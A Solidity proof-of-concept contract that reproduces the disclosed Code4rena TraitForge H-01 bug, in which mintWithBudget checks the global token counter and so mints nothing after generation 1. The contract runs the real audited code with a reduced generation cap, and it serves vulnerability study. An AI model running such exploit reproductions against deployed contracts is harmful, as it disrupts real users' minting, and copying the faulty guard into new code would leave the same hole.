// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Real, audited TraitForge sources (byte-identical to the registry `src/` vendor,
// from https://github.com/code-423n4/2024-07-traitforge @ 72077d0). The Playground
// runs the REAL vulnerable mintWithBudget loop, not a hand-written model.
import {TraitForgeNft} from "../src/traitforge/contracts/TraitForgeNft/TraitForgeNft.sol";
import {EntropyGenerator} from "../src/traitforge/contracts/EntropyGenerator/EntropyGenerator.sol";
import {EntityForging} from "../src/traitforge/contracts/EntityForging/EntityForging.sol";
import {Airdrop} from "../src/traitforge/contracts/Airdrop/Airdrop.sol";
import {NukeFund} from "../src/traitforge/contracts/NukeFund/NukeFund.sol";

/// @dev The ONLY change vs. the audited contract: `maxTokensPerGen` is shrunk from
/// 10,000 to 3 so a second generation is reachable without minting 10,000 tokens in
/// a single browser-EVM call. Every vulnerable code path (mintWithBudget's
/// `_tokenIds < maxTokensPerGen` guard, _mintInternal, _incrementGeneration,
/// calculateMintPrice) is the real inherited audited logic, unmodified.
contract TraitForgeNftSmall is TraitForgeNft {
    constructor() {
        maxTokensPerGen = 3;
    }
}

/// @dev Holds the generation-1 fill + the first generation-2 token, keeping them off
/// the Exploit's scoreboard so the measured NFT balance is exactly the generation-2
/// batch that the bricked mintWithBudget refused to mint.
contract Minter {
    function mint(TraitForgeNft nft, uint256 price) external payable {
        nft.mintToken{value: price}(new bytes32[](0));
    }

    receive() external payable {}
}

/// Reproduces Code4rena TraitForge H-01 (#37915): mintWithBudget guards on the
/// GLOBAL `_tokenIds` supply counter instead of the current generation's counter,
/// so once generation 1 is full it mints ZERO tokens in every later generation.
contract Exploit {
    TraitForgeNftSmall public nft;
    EntropyGenerator public entropy;
    EntityForging public forging;
    Airdrop public airdrop;
    NukeFund public nukeFund;
    Minter public filler;

    uint256 public gen2MintedByBudget;   // tokens the buggy mintWithBudget minted in gen 2 (== 0)
    uint256 public gen2DeniedBatchSize;  // the batch it refused, recovered one-by-one (the harm)

    constructor() {
        nft = new TraitForgeNftSmall();
        entropy = new EntropyGenerator(address(nft));
        forging = new EntityForging(address(nft));
        airdrop = new Airdrop();
        nukeFund = new NukeFund(address(nft), address(airdrop), payable(address(0xDe7)), payable(address(0xDa0)));

        nft.setEntropyGenerator(address(entropy));
        nft.setEntityForgingContract(address(forging));
        nft.setAirdropContract(address(airdrop));
        nft.setNukeFundContract(payable(address(nukeFund)));

        // Production wiring: the NFT drives EntropyGenerator.initializeAlphaIndices()
        // and Airdrop.addUserAmount(), both onlyOwner.
        entropy.transferOwnership(address(nft));
        airdrop.transferOwnership(address(nft));

        nft.setWhitelistEndTime(0); // public-sale phase
        filler = new Minter();
    }

    receive() external payable {}

    function run() external payable {
        // Fill generation 1 (cap = 3) and cross into generation 2 via the Minter, so
        // these tokens are held by the filler and excluded from the harm measurement.
        for (uint256 i = 0; i < 3; i++) {
            uint256 p = nft.calculateMintPrice();
            filler.mint{value: p}(nft, p);
        }
        uint256 pc = nft.calculateMintPrice();
        filler.mint{value: pc}(nft, pc); // triggers the real _incrementGeneration -> gen 2
        require(nft.currentGeneration() == 2, "reached generation 2");
        require(nft.generationMintCounts(2) == 1, "one gen-2 token minted so far");

        // THE EXPLOIT: a whitelisted user batch-mints in generation 2 with a budget
        // that funds 20 tokens. The buggy `_tokenIds < maxTokensPerGen` guard is
        // already false (_tokenIds == 4 >= 3), so ZERO tokens are minted.
        uint256 price = nft.calculateMintPrice();
        uint256 budget = price * 20;
        uint256 balBefore = nft.balanceOf(address(this));
        nft.mintWithBudget{value: budget}(new bytes32[](0));
        gen2MintedByBudget = nft.balanceOf(address(this)) - balBefore;
        require(gen2MintedByBudget == 0, "BUG NOT REPRODUCED: mintWithBudget minted in generation 2");
        require(nft.generationMintCounts(2) == 1, "generation 2 untouched by mintWithBudget");

        // Quantify the harm: the 20-token batch mintWithBudget refused is only
        // obtainable by sending 20 separate mintToken transactions.
        for (uint256 i = 0; i < 20; i++) {
            uint256 pp = nft.calculateMintPrice();
            nft.mintToken{value: pp}(new bytes32[](0));
        }
        gen2DeniedBatchSize = nft.balanceOf(address(this));
        require(gen2DeniedBatchSize == 20, "recovered the denied batch one-by-one");
    }
}
